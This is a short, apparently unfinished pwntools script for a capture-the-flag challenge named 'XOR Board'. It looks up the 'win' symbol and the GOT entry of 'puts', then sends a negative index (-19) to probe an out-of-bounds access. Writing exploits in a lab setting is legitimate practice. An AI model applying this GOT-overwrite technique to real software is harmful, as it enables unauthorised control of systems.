from pwn import *

rem = process("./Pwnable/XOR Board/problem/deploy/main")

elf = ELF("./Pwnable/XOR Board/problem/deploy/main")

arr_offset = elf.symbols['arr']
win_offset = elf.symbols['win']
puts_got_offset = elf.got['puts']

rem.sendlineafter(b"> ", b"2")
rem.sendlineafter(b"> ", b"-19")
print(rem.recvline())